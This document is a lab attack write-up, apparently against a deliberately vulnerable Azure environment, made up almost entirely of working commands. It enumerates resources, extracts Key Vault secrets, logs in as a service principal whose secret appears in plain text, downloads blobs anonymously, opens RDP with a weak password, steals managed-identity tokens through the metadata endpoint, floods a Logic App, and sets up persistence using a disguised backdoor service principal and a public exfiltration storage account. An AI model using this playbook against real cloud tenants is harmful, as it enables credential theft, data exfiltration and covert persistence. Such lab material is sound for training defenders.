---

# Attack Execution Summary

---

# Phase 1 – Cloud Resource Reconnaissance

## 1.1 Resource Enumeration

```bash
az resource list --resource-group HTB-mumbai 
--output table
```

![alt text](images/image-1.png)

## 1.2 Key Vault Discovery

```bash
az keyvault list --resource-group HTB-mumbai
```

![alt text](images/image-2.png)

## 1.3 Storage Account Enumeration

```bash
az storage account list --resource-group HTB-mumbai
```

![alt text](images/image-3.png)

## 1.4 Virtual Machine Enumeration

```bash
az vm list --resource-group HTB-mumbai --show-details
```

![alt text](images/image-4.png)

## 1.5 Managed Identity Enumeration

```bash
az identity list --resource-group HTB-mumbai
```

![alt text](images/image-5.png)

## 1.6 Network Security Group Rule Enumeration

**Execution Issue**
The initial command failed due to missing resource group scope parameter.

```bash
az network nsg rule list --nsg-name vulnerable-nsg
```

![alt text](images/image-6.png)

**Corrected Command**

```bash
az network nsg rule list --resource-group HTB-mumbai --nsg-name vulnerable-nsg
```

![alt text](images/image-7.png)

---

# Phase 2 – Key Vault Secret Extraction

## 2.1 Secret Enumeration

```bash
az keyvault secret list --vault-name kv-vuln-b3hrxj --output table
```

![alt text](images/image-8.png)

## 2.2 Secret Exfiltration

```bash
DB_PASSWORD=$(az keyvault secret show --vault-name kv-vuln-b3hrxj --name db-password --query value -o tsv)
API_KEY=$(az keyvault secret show --vault-name kv-vuln-b3hrxj --name api-key --query value -o tsv)
SP_CLIENT_ID=$(az keyvault secret show --vault-name kv-vuln-b3hrxj --name service-principal-client-id --query value -o tsv)
SP_SECRET=$(az keyvault secret show --vault-name kv-vuln-b3hrxj --name service-principal-secret --query value -o tsv)
```

![alt text](images/image-9.png)

**Stored Secret Variables**
![alt text](images/image-10.png)

---

# Phase 3 – Privilege Escalation via Service Principal

## 3.1 Service Principal Authentication

```bash
az logout

az login --service-principal \
  -u "1e353573-b8d1-472a-ad1f-b5235b8731ff" \
  -p "pWQ8Q~wgiICLb1_iYkzrzlkTPNZdIKLFLCT7KaOK" \
  --tenant "48af3af8-817e-42f2-b1e6-a7407e682b7e"
```

![alt text](images/image-11.png)

**Execution Issue**
Authentication failed due to missing role assignment at the resource group scope.

![alt text](images/image-35.png)

**Corrective Administrative Action**

1. Navigate to Resource Groups → HTB-mumbai
2. Open Access control (IAM)
3. Select + Add → Add role assignment
4. Choose Contributor role
5. Add member vulnerable-service-principal
6. Review and assign

![alt text](images/image-36.png)

## 3.2 Access Verification

```bash
az account show
```

![alt text](images/image-12.png)

**Execution Issue**
Initial role assignment listing returned incomplete output.

```bash
az role assignment list --all --output table
```

![alt text](images/image-14.png)

**Corrected Command**

```bash
 az role assignment list --all 
```

![alt text](images/image-15.png)

```bash
az resource list --resource-group HTB-mumbai 
```

![alt text](images/image-16.png)

---

# Phase 4 – Storage Account Data Exfiltration

## 4.1 Anonymous Blob Access

```bash
#Direct download - NO AUTH REQUIRED!
curl -o "confidential.txt" \
  "https://stvulnb3hrxj.blob.core.windows.net/sensitive-data/confidential.txt"
```

![alt text](images/image-17.png)
![alt text](images/image-18.png)

```bash
curl -o "customers.csv" \
  "https://stvulnb3hrxj.blob.core.windows.net/sensitive-data/customers.csv"
```

![alt text](images/image-19.png)

## 4.2 Storage Account Key Abuse

```bash
STORAGE_KEY=$(az storage account keys list \
  --resource-group HTB-mumbai \
  --account-name stvulnb3hrxj \
  --query [0].value -o tsv)

az storage blob list \
  --account-name stvulnb3hrxj \
  --container-name sensitive-data \
  --account-key $STORAGE_KEY
```

![alt text](images/image-20.png)

```bash
az storage blob download \
  --account-name stvulnb3hrxj \
  --container-name sensitive-data \
  --name confidential.txt \
  --file exfiltrated-confidential.txt \
  --account-key $STORAGE_KEY
```

![alt text](images/image-21.png)

---

# Phase 5 – Virtual Machine Compromise & Managed Identity Abuse

## 5.1 Public IP Identification

```bash
az vm list-ip-addresses --resource-group HTB-mumbai
```

![alt text](images/image-37.png)

## 5.2 Network Reconnaissance

```bash
nmap -p 22,80,3389,5985 20.235.102.210
```

**Execution Adjustment**
ICMP response was blocked; scan modified to disable host discovery.

```bash
nmap -Pn --open -p 22,80,3389,5985 20.235.102.210
```

![alt text](images/image-22.png)

## 5.3 Remote Desktop Access

```bash
 rdesktop 20.235.102.210 -u azureuser -p 'WeakPassword123!' 
```

![alt text](images/image-23.png)

**Execution Issue**
RDP client compatibility issue encountered.

```bash
xfreerdp3 /v:20.235.102.210 /u:azureuser /p:'WeakPassword123!' /cert:ignore
```

![alt text](images/image-24.png)
![alt text](images/image-25.png)

## 5.4 Managed Identity Token Retrieval

```bash
# Running INSIDE the Windows VM now
$response = Invoke-RestMethod `
  -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' `
  -Headers @{Metadata="true"}

# Got access token!
$token = $response.access_token
```

![alt text](images/image-26.png)

## 5.5 Key Vault Access from VM

```bash
# Get Key Vault access token
$kvToken = (Invoke-RestMethod `
  -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' `
  -Headers @{Metadata="true"}).access_token

# Access secrets
$headers = @{Authorization = "Bearer $kvToken"}
Invoke-RestMethod `
  -Uri 'https://kv-vuln-b3hrxj.vault.azure.net/secrets?api-version=7.4' `
  -Headers $headers

# Get specific secret
Invoke-RestMethod `
  -Uri 'https://kv-vuln-b3hrxj.vault.azure.net/secrets/db-password?api-version=7.4' `
  -Headers $headers
```

![alt text](images/image-27.png)

---

# Phase 6 – Logic App Exploitation

## 6.1 Retrieve Callback URL

```bash
LOGIC_APP_URL=$(az rest --method post \
  --uri "https://management.azure.com/subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/HTB-mumbai/providers/Microsoft.Logic/workflows/vulnerable-workflow/triggers/manual/listCallbackUrl?api-version=2016-06-01" \
  --query value -o tsv)
```

![alt text](images/image-28.png)

## 6.2 Unauthenticated Trigger Execution

```bash
# Anyone with URL can trigger - NO AUTH!
curl -X POST "$LOGIC_APP_URL" \
  -H "Content-Type: application/json" \
  -d '{"secret": "malicious_data", "action": "exfiltrate"}'
```

![alt text](images/image-29.png)

## 6.3 High-Frequency Trigger Execution

```bash
# Trigger 100 times
for i in {1..100}; do
  curl -X POST "$LOGIC_APP_URL" \
    -H "Content-Type: application/json" \
    -d "{\"iteration\": $i}" \
    --silent &
done
```

![alt text](images/image-30.png)
![alt text](images/image-31.png)

---

# Phase 7 – Persistence Establishment

## 7.1 Service Principal Creation

```bash
BACKDOOR_SP=$(az ad sp create-for-rbac \
  --name "legitimate-monitoring-app" \
  --role Contributor \
  --scopes /subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/HTB-mumbai)

BACKDOOR_APP_ID=$(echo $BACKDOOR_SP | jq -r '.appId')
BACKDOOR_PASSWORD=$(echo $BACKDOOR_SP | jq -r '.password')
```

## 7.2 Backdoor Storage Deployment

```bash
BACKDOOR_STORAGE="legitlogs$RANDOM"
 
az storage account create \
  --name $BACKDOOR_STORAGE \
  --resource-group HTB-mumbai \
  --location "Central India" \
  --sku Standard_LRS \
  --allow-blob-public-access true
```

![alt text](images/image-32.png)

```bash
# Create public container
az storage container create \
  --name exfiltrated-data \
  --account-name $BACKDOOR_STORAGE \
  --public-access blob
```

![alt text](images/image-33.png)

## 7.3 Data Transfer to Persistence Layer

```bash
# Copy all exfiltrated files to backdoor storage
BACKDOOR_KEY=$(az storage account keys list \
  --account-name $BACKDOOR_STORAGE \
  --query [0].value -o tsv)

az storage blob upload \
  --account-name $BACKDOOR_STORAGE \
  --container-name exfiltrated-data \
  --name confidential.txt \
  --file exfiltrated-confidential.txt \
  --account-key $BACKDOOR_KEY
```

![alt text](images/image-34.png)

---
